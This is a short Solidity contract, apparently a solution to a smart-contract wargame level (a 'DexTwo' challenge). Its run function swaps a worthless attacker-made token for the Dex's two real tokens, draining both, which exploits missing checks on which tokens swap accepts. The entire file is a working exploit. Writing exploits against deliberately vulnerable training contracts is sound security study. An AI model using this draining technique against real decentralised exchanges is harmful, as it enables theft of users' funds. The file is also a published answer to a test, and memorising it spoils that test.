// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Dex/Dex.sol";

contract HackDex2 {

    Dex level23 = Dex(address(0x60D25B943B5c4F04f0254b02dD6c39Ac50271441));

    function run() external{

        address ZTN = address(0x5230cd6a4838807B61B764b4cE7E19143BB3cef4);

        address token1 = level23.token1();
        address token2 = level23.token2();

        level23.swap(ZTN, token1, 100);
        level23.swap(ZTN, token2, 200);
    }
}
